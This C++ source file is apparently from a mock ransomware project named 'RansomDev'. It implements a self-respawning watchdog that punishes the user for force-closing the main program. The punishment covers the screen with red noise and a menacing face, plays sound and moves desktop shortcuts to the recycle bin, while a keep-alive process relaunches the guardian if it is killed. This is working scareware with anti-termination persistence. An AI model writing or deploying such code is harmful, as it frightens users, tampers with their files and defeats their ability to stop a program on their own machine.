


#include "guardian.h"

#include "audio.h"
#include "entity_log.h"
#include "face.h"
#include "fx.h"
#include "gold.h"
#include "recycle.h"

#include <cstdlib>
#include <cwchar>
#include <string>

#include <objbase.h>
#include <objidl.h>
#include <propidl.h>
#include <gdiplus.h>

#pragma comment(lib, "gdiplus.lib")

namespace {



    const wchar_t* kDisarmPrefix = L"Local\\RansomDev_Disarm_";
    const wchar_t* kPunishMarkName = L"ransom_dev_punish.done";


    HANDLE g_disarmEvent = nullptr;
    HANDLE g_guardianProcess = nullptr;
    DWORD  g_guardianPid = 0;
    DWORD  g_lastCheckTick = 0;
    bool   g_disarmed = false;



    void MakeDisarmName(DWORD pid, wchar_t* buf, size_t cch)
    {
        swprintf_s(buf, cch, L"%s%lu", kDisarmPrefix, (unsigned long)pid);
    }


    HANDLE OpenDisarmEvent(DWORD pid)
    {
        wchar_t name[128];
        MakeDisarmName(pid, name, _countof(name));
        return OpenEventW(SYNCHRONIZE, FALSE, name);
    }





    HANDLE CreateDisarmEvent(DWORD pid)
    {
        wchar_t name[128];
        MakeDisarmName(pid, name, _countof(name));
        HANDLE h = CreateEventW(nullptr, TRUE, FALSE, name);



        return h;
    }


    std::wstring PunishMarkPath()
    {
        wchar_t dir[MAX_PATH] = {};
        if (!GetTempPathW(_countof(dir), dir)) return L"";
        std::wstring p = dir;
        p += kPunishMarkName;
        return p;
    }

    bool PunishAlreadyRan()
    {
        const std::wstring p = PunishMarkPath();
        if (p.empty()) return false;
        return GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES;
    }

    void MarkPunishRan()
    {
        const std::wstring p = PunishMarkPath();
        if (p.empty()) return;
        HANDLE h = CreateFileW(p.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
    }

    std::wstring ExePath()
    {
        wchar_t buf[MAX_PATH] = {};
        const DWORD n = GetModuleFileNameW(nullptr, buf, MAX_PATH);
        if (n == 0 || n >= MAX_PATH) return L"";
        return buf;
    }



    HANDLE SpawnGuardian(DWORD targetPid, int generation)
    {
        const std::wstring exe = ExePath();
        if (exe.empty()) return nullptr;


        wchar_t cmd[512];
        swprintf_s(cmd, L"\"%s\" --guardian %lu %d",
            exe.c_str(), (unsigned long)targetPid, generation);

        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        PROCESS_INFORMATION pi = {};




        if (!CreateProcessW(exe.c_str(), cmd, nullptr, nullptr, FALSE, 0,
            nullptr, nullptr, &si, &pi))
        {
            elog::Write(L"[guardian] CreateProcess 失败（目标 %lu gen %d），err=%lu",
                (unsigned long)targetPid, generation, GetLastError());
            return nullptr;
        }

        CloseHandle(pi.hThread);
        return pi.hProcess;
    }



    bool ProcessAlive(DWORD pid)
    {
        HANDLE h = OpenProcess(SYNCHRONIZE, FALSE, pid);
        if (!h) return false;
        const DWORD r = WaitForSingleObject(h, 0);
        CloseHandle(h);
        return (r == WAIT_TIMEOUT);
    }

}


namespace guardian {

    void ClearPunishMark()
    {
        const std::wstring p = PunishMarkPath();
        if (!p.empty()) DeleteFileW(p.c_str());
    }



    bool Start(HINSTANCE          )
    {
        if (g_disarmEvent) return true;

        const DWORD myPid = GetCurrentProcessId();


        g_disarmEvent = CreateDisarmEvent(myPid);
        if (!g_disarmEvent)
        {
            elog::Write(L"[guardian] 创建 Disarm 事件失败, err=%lu", GetLastError());


            return false;
        }

        g_guardianProcess = SpawnGuardian(myPid, 0);
        if (!g_guardianProcess)
        {
            elog::Write(L"[guardian] 守护进程启动失败 —— 本进程被强杀时不会触发惩罚");
            return false;
        }

        g_guardianPid = GetProcessId(g_guardianProcess);
        g_lastCheckTick = GetTickCount();

        elog::Write(L"[guardian] 守护进程已启动 pid=%lu（本进程 %lu）",
            (unsigned long)g_guardianPid, (unsigned long)myPid);
        return true;
    }

    void Disarm()
    {
        if (g_disarmed) return;
        g_disarmed = true;

        if (g_disarmEvent) SetEvent(g_disarmEvent);
        elog::Write(L"[guardian] 已 Disarm —— 守护不会因为本进程退出而触发惩罚");
    }

    void Tick()
    {
        if (!g_disarmEvent) return;

        const DWORD now = GetTickCount();
        if (now - g_lastCheckTick < 1000) return;
        g_lastCheckTick = now;

        if (g_guardianProcess)
        {
            const DWORD r = WaitForSingleObject(g_guardianProcess, 0);
            if (r == WAIT_TIMEOUT) return;


            CloseHandle(g_guardianProcess);
            g_guardianProcess = nullptr;
            g_guardianPid = 0;
            elog::Write(L"[guardian] 守护进程已消失，重新拉起一个");
        }

        const DWORD myPid = GetCurrentProcessId();
        g_guardianProcess = SpawnGuardian(myPid, 0);
        if (g_guardianProcess)
        {
            g_guardianPid = GetProcessId(g_guardianProcess);
            elog::Write(L"[guardian] 守护进程已重建 pid=%lu", (unsigned long)g_guardianPid);
        }
    }

    void Stop()
    {
        if (g_guardianProcess)
        {
            CloseHandle(g_guardianProcess);
            g_guardianProcess = nullptr;
        }
        if (g_disarmEvent)
        {
            CloseHandle(g_disarmEvent);
            g_disarmEvent = nullptr;
        }
        g_guardianPid = 0;
    }



    bool IsGuardianMode()
    {
        for (int i = 1; i < __argc; ++i)
            if (_wcsicmp(__wargv[i], L"--guardian") == 0) return true;
        return false;
    }

    bool ParseGuardianArgs(int argc, wchar_t** argv, DWORD& targetPid, int& generation)
    {
        targetPid = 0;
        generation = 0;

        for (int i = 1; i < argc; ++i)
        {
            if (_wcsicmp(argv[i], L"--guardian") != 0) continue;
            if (i + 1 >= argc) return false;

            targetPid = (DWORD)_wtoi(argv[i + 1]);
            if (targetPid == 0) return false;



            if (i + 2 < argc && argv[i + 2][0] != L'-')
                generation = _wtoi(argv[i + 2]);

            return true;
        }
        return false;
    }












    static void RunPunishShow()
    {
        elog::Write(L"[guardian] === 开始惩罚演出 ===");

        Gdiplus::GdiplusStartupInput gsi;
        ULONG_PTR gdipToken = 0;
        const bool gdipOk =
            (Gdiplus::GdiplusStartup(&gdipToken, &gsi, nullptr) == Gdiplus::Ok);

        const HRESULT hrCom = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        HINSTANCE hInst = GetModuleHandleW(nullptr);


        if (gdipOk)
        {
            face::Start(hInst);
            fx::Start(hInst);
        }
        gold::Start(hInst);
        recycle::Start(hInst);
        audio::Start();


        fx::SetSolid(true, RGB(80, 0, 0));
        fx::SetNoise(55);

        face::ShowAttack(4000);
        audio::PlayHit();


        const int n = recycle::SendToBin();
        elog::Write(L"[guardian] 回收站：收走 %d 个快捷方式", n);



        const DWORD start = GetTickCount();
        MSG msg;
        while (GetTickCount() - start < 4500)
        {
            while (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE))
            {
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }
            Sleep(10);
        }


        fx::ClearAll();
        face::Hide();
        audio::Silence();

        if (gdipOk) fx::Stop();
        if (gdipOk) face::Stop();
        audio::Stop();
        recycle::Stop();
        gold::Stop();

        if (SUCCEEDED(hrCom)) CoUninitialize();
        if (gdipOk) Gdiplus::GdiplusShutdown(gdipToken);

        elog::Write(L"[guardian] === 惩罚演出结束 ===");
    }

    int RunGuardian(HINSTANCE hInst, DWORD targetPid, int generation)
    {

        wchar_t tempDir[MAX_PATH] = {};
        GetTempPathW(_countof(tempDir), tempDir);

        wchar_t logPath[MAX_PATH];
        swprintf_s(logPath, L"%sransom_dev_guardian_%lu.log",
            tempDir, (unsigned long)GetCurrentProcessId());
        elog::Open(logPath);

        elog::Write(L"[guardian] 守护进程启动：pid=%lu 目标=%lu 代次=%d",
            (unsigned long)GetCurrentProcessId(),
            (unsigned long)targetPid, generation);


        HANDLE myDisarm = CreateDisarmEvent(GetCurrentProcessId());
        if (!myDisarm)
            elog::Write(L"[guardian] 自己的 Disarm 事件创建失败, err=%lu", GetLastError());


        HANDLE targetDisarm = OpenDisarmEvent(targetPid);

        int exitCode = 0;


        if (!ProcessAlive(targetPid))
        {
            elog::Write(L"[guardian] 目标进程 %lu 一启动就没了",
                (unsigned long)targetPid);
            if (!PunishAlreadyRan())
            {
                MarkPunishRan();
                RunPunishShow();
            }
            if (myDisarm) { SetEvent(myDisarm); CloseHandle(myDisarm); }
            if (targetDisarm) CloseHandle(targetDisarm);
            elog::Close();
            return exitCode;
        }





        bool targetDisarmed = false;
        for (;;)
        {

            if (targetDisarm &&
                WaitForSingleObject(targetDisarm, 0) == WAIT_OBJECT_0)
            {
                targetDisarmed = true;
            }

            if (!ProcessAlive(targetPid))
                break;

            Sleep(500);
        }

        elog::Write(L"[guardian] 目标已退出：disarmed=%d", (int)targetDisarmed);

        if (targetDisarmed)
        {
            elog::Write(L"[guardian] 目标是正常退出，守护一并退出（不触发惩罚）");
        }
        else if (PunishAlreadyRan())
        {
            elog::Write(L"[guardian] 惩罚已经跑过了，跳过");
        }
        else
        {


            MarkPunishRan();



            if (generation == 0)
            {
                HANDLE keepAlive = SpawnGuardian(GetCurrentProcessId(), 1);
                if (keepAlive)
                {
                    elog::Write(L"[guardian] 保活进程已启动 pid=%lu",
                        (unsigned long)GetProcessId(keepAlive));
                    CloseHandle(keepAlive);
                }
                else
                {
                    elog::Write(L"[guardian] 保活进程启动失败 —— 惩罚期间被强杀就没有接力了");
                }
            }

            RunPunishShow();
        }


        if (myDisarm) SetEvent(myDisarm);

        if (targetDisarm) CloseHandle(targetDisarm);
        if (myDisarm) CloseHandle(myDisarm);
        elog::Close();

        return exitCode;
    }

}